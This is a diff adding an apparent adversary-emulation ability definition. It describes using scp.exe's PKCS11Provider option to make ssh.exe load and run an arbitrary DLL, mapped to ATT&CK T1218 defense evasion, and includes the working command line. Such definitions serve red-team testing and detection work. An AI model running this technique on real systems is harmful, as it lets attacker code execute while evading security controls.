@@ -1,0 +1,29 @@
+- id: 61466e87-1a3f-54c8-90b9-b9b96ac7a7f8
+  name: scp.exe - Loads a DLL from an absolute path or SMB path into child process
+    `ssh.exe` by abusing the `PKCS11Provider` option. The payload executes upon DLL
+    load (`DllMain`) and requires exporting `C_GetFunctionList` to prevent premature
+    termination by `scp.exe`.
+  description: Loads a DLL from an absolute path or SMB path into child process `ssh.exe`
+    by abusing the `PKCS11Provider` option. The payload executes upon DLL load (`DllMain`)
+    and requires exporting `C_GetFunctionList` to prevent premature termination by
+    `scp.exe`.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: scp -o PKCS11Provider="payload.dll" . win@github.com:.
+        payloads:
+        - payload.dll
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: BinFault
+  created: '2026-06-03'
+  modified: '2026-06-03'
+  operating_system: Windows All Versions
